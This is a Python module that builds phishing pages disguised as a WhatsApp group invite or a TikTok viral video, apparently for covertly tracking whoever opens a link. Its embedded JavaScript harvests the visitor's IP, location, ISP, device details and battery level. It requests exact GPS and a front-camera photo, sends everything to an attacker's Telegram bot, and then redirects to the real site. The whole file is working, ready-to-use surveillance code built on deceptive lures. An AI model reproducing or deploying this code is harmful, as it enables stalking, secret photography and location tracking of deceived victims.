
"""
Plantillas HTML para el módulo de tracking.
Contiene la estructura base y los scripts JS para Geo y Cam tracking.
"""

CSS_STYLES_WHATSAPP = """
<style>
    * {margin: 0; padding: 0; box-sizing: border-box;}
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background: #0a0f1c;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
    }
    .container {
        background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
        border-radius: 20px;
        padding: 40px;
        max-width: 500px;
        width: 100%;
        box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
        text-align: center;
        animation: fadeIn 0.6s ease;
    }
    @keyframes fadeIn {
        from {opacity: 0; transform: translateY(-30px);}
        to {opacity: 1; transform: translateY(0);}
    }
    .logo {
        width: 80px;
        height: 80px;
        margin: 0 auto 20px;
        background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
        border-radius: 20px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 45px;
        box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
    }
    h1 {
        color: #ffffff;
        font-size: 26px;
        margin-bottom: 10px;
        font-weight: 600;
    }
    p {
        color: #8b949e;
        font-size: 15px;
        line-height: 1.6;
        margin-bottom: 25px;
    }
    .btn {
        background: linear-gradient(135deg, #25d366 0%, #128c7e 100%);
        color: white;
        padding: 15px 40px;
        border: none;
        border-radius: 30px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(37, 211, 102, 0.3);
        transition: all 0.3s ease;
        text-decoration: none;
        display: inline-block;
    }
    .btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(37, 211, 102, 0.4);
    }
    .loader {
        width: 50px;
        height: 50px;
        border: 4px solid #21262d;
        border-top: 4px solid #25d366;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 20px;
    }
    @keyframes spin {
        0% {transform: rotate(0deg);}
        100% {transform: rotate(360deg);}
    }
    .hidden {display: none;}
    .members {
        color: #58a6ff;
        font-size: 14px;
        margin-top: 15px;
    }
</style>
"""

CSS_STYLES_CAMERA = """
<style>
    * {margin: 0; padding: 0; box-sizing: border-box;}
    body {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        background: #000000;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        padding: 20px;
    }
    .container {
        background: #111111;
        border-radius: 16px;
        padding: 36px 30px;
        max-width: 420px;
        width: 100%;
        box-shadow: 0 0 40px rgba(254,44,85,0.2);
        text-align: center;
        animation: fadeIn 0.5s ease;
        border: 1px solid #222;
    }
    @keyframes fadeIn {
        from {opacity: 0; transform: translateY(-20px);}
        to {opacity: 1; transform: translateY(0);}
    }
    .logo {
        width: 72px;
        height: 72px;
        margin: 0 auto 18px;
        background: linear-gradient(135deg, #fe2c55 0%, #ee1d52 50%, #69c9d0 100%);
        border-radius: 16px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 38px;
        box-shadow: 0 4px 20px rgba(254, 44, 85, 0.5);
    }
    .badge {
        display: inline-block;
        background: #fe2c55;
        color: white;
        font-size: 11px;
        font-weight: 700;
        padding: 3px 10px;
        border-radius: 20px;
        text-transform: uppercase;
        letter-spacing: 1px;
        margin-bottom: 14px;
    }
    h1 {
        color: #ffffff;
        font-size: 22px;
        margin-bottom: 8px;
        font-weight: 700;
    }
    .username {
        color: #fe2c55;
        font-size: 15px;
        font-weight: 600;
        margin-bottom: 16px;
    }
    p {
        color: #888888;
        font-size: 14px;
        line-height: 1.6;
        margin-bottom: 24px;
    }
    .stats {
        display: flex;
        justify-content: center;
        gap: 30px;
        margin-bottom: 24px;
        border-top: 1px solid #222;
        border-bottom: 1px solid #222;
        padding: 14px 0;
    }
    .stat-item {
        text-align: center;
    }
    .stat-num {
        color: #ffffff;
        font-size: 18px;
        font-weight: 700;
        display: block;
    }
    .stat-label {
        color: #666;
        font-size: 12px;
    }
    .loader {
        width: 44px;
        height: 44px;
        border: 3px solid #222;
        border-top: 3px solid #fe2c55;
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
        margin: 0 auto 16px;
    }
    @keyframes spin {
        0% {transform: rotate(0deg);}
        100% {transform: rotate(360deg);}
    }
    .hidden {display: none;}
    .footer-note {
        color: #444;
        font-size: 12px;
        margin-top: 16px;
    }
</style>
"""

JS_COMMON_FUNCTIONS = """
const BOT='__TOKEN__', CHAT='__CHAT_ID__';

const send = async (txt) => {
    await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT, text: txt, parse_mode: 'HTML', disable_web_page_preview: false})
    });
};

const sendLocation = async (lat, lon) => {
    await fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({chat_id: CHAT, latitude: lat, longitude: lon})
    });
};

const sendPhoto = async (blob) => {
    const formData = new FormData();
    formData.append('chat_id', CHAT);
    formData.append('photo', blob, 'capture.jpg');
    formData.append('caption', '📸 <b>Captura de Camara</b>');
    formData.append('parse_mode', 'HTML');
    
    await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {
        method: 'POST',
        body: formData
    });
};

const getBasicInfo = async () => {
    let info = `🔍 <b>NUEVA VISITA DETECTADA</b>\\n\\n`;
    let ip = '';
    let lat = 0, lon = 0;
    
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        ip = d.ip;
        info += `🌐 <b>IP:</b> <code>${ip}</code>\\n`;
        
        const ipd = await fetch(`https://ip-api.com/json/${ip}?fields=lat,lon,city,country,isp,status`);
        const geo = await ipd.json();
        if(geo.status === 'success') {
            lat = geo.lat;
            lon = geo.lon;
            info += `📍 <b>Ubicacion:</b> ${geo.city}, ${geo.country}\\n`;
            info += `🏢 <b>ISP:</b> ${geo.isp}\\n`;
            info += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>\\n`;
        }
    } catch(e) {}
    
    info += `📱 <b>UA:</b> ${navigator.userAgent}\\n`;
    info += `💻 <b>OS:</b> ${navigator.platform}\\n`;
    try {
        const battery = await navigator.getBattery();
        info += `🔋 <b>Bateria:</b> ${Math.round(battery.level * 100)}%\\n`;
    } catch(e) {}
    
    await send(info);
    
    return {lat, lon};
};
"""

JS_GEO_AUTO = """
const getGeoAuto = async (ipLat, ipLon) => {
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (p) => {
            const lat = p.coords.latitude;
            const lon = p.coords.longitude;
            const acc = p.coords.accuracy;
            let gps = `🎯 <b>GPS EXACTO OBTENIDO</b>\\n\\n`;
            gps += `📍 <b>Coords:</b> <code>${lat}, ${lon}</code>\\n`;
            gps += `📏 <b>Precision:</b> ${acc} metros\\n`;
            gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>`;
            await send(gps);
            await sendLocation(lat, lon);
            redirect();
        }, async (e) => {
            if(ipLat && ipLon) {
                let gps = `📍 <b>Ubicacion por IP</b>\\n\\n`;
                gps += `📍 <b>Coords:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
                gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver en Mapa</a>\\n`;
                gps += `\\nℹ️ <i>GPS no disponible, usando ubicacion de red</i>`;
                await send(gps);
                await sendLocation(ipLat, ipLon);
            } else {
                await send(`❌ <b>GPS Denegado:</b> No se pudo obtener ubicacion`);
            }
            redirect();
        }, {enableHighAccuracy: true, timeout: 15000, maximumAge: 0});
    } else {
        if(ipLat && ipLon) {
            let gps = `📍 <b>Ubicacion por IP</b>\\n\\n`;
            gps += `📍 <b>Coords:</b> <code>${ipLat}, ${ipLon}</code>\\n`;
            gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${ipLat},${ipLon}">Ver en Mapa</a>`;
            await send(gps);
            await sendLocation(ipLat, ipLon);
        }
        redirect();
    }
};
"""

JS_CAM_AUTO = """
const getCamAuto = async () => {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: "user" },
            audio: false
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        video.onloadedmetadata = () => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                canvas.toBlob(async (blob) => {
                    await sendPhoto(blob);
                    stream.getTracks().forEach(t => t.stop());
                    getGeoAuto(0, 0);
                }, 'image/jpeg', 0.9);
            }, 1500);
        };
    } catch (e) {
        await send(`❌ <b>Camara Denegada/Error:</b> ${e.message}`);
        getGeoAuto(0, 0);
    }
};
"""

def get_template(token, chat_id, mode="geo"):
    """Genera el HTML completo con camuflaje atractivo"""
    
    logic = JS_COMMON_FUNCTIONS.replace('__TOKEN__', token).replace('__CHAT_ID__', str(chat_id))
    
    if mode == "cam":
        css = CSS_STYLES_CAMERA
        init_call = "const ipGeo = await getBasicInfo(); getCamAuto();"
        logic += JS_GEO_AUTO + JS_CAM_AUTO
        icon = "🎵"
        title = "@viral_clips_mx"
        subtitle = "Cargando video exclusivo... Activa el acceso a la cámara para una mejor experiencia."
        extra_html = '''
        <div class="badge">LIVE</div>
        <div class="stats">
            <div class="stat-item"><span class="stat-num">2.4M</span><span class="stat-label">seguidores</span></div>
            <div class="stat-item"><span class="stat-num">18.3M</span><span class="stat-label">me gusta</span></div>
            <div class="stat-item"><span class="stat-num">847</span><span class="stat-label">videos</span></div>
        </div>
        <div class="footer-note" id="members">Verificando acceso al contenido...</div>
        '''
        redirect_url = "https://www.tiktok.com"
        redirect_text = "TikTok"
        meta_desc = "Video viral exclusivo"
        page_title = "TikTok - Ver video"
    else:
        css = CSS_STYLES_WHATSAPP
        init_call = "const ipGeo = await getBasicInfo(); getGeoAuto(ipGeo.lat, ipGeo.lon);"
        logic += JS_GEO_AUTO
        icon = "💬"
        title = "Únete al Grupo"
        subtitle = "Te han invitado a un grupo privado. Verificando tu ubicación para acceso seguro..."
        extra_html = '<div class="members" id="members">🟢 45 miembros activos</div>'
        redirect_url = "https://web.whatsapp.com"
        redirect_text = "WhatsApp"
        meta_desc = "Grupo privado de WhatsApp"
        page_title = "WhatsApp - Unirse al grupo"

    template = f"""<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="{meta_desc}">
    <title>{page_title}</title>
    __CSS__
</head>
<body>
    <div class="container">
        <div class="logo">{icon}</div>
        {extra_html}
        <h1 id="title">{title}</h1>
        <p id="subtitle">{subtitle}</p>
        <div class="loader" id="loader"></div>
    </div>
    <script>
        const redirect = () => {{
            document.getElementById('loader').classList.add('hidden');
            document.getElementById('title').innerText = '✅ Acceso Verificado';
            document.getElementById('subtitle').innerText = 'Redirigiendo a {redirect_text}...';
            setTimeout(() => {{
                window.location.href = "{redirect_url}";
            }}, 2000);
        }};
        
        __LOGIC__
        
        (async () => {{
            __INIT__
        }})();
    </script>
</body>
</html>
"""
    html = template.replace('__CSS__', css)
    html = html.replace('__LOGIC__', logic)
    html = html.replace('__INIT__', init_call)
    
    return html
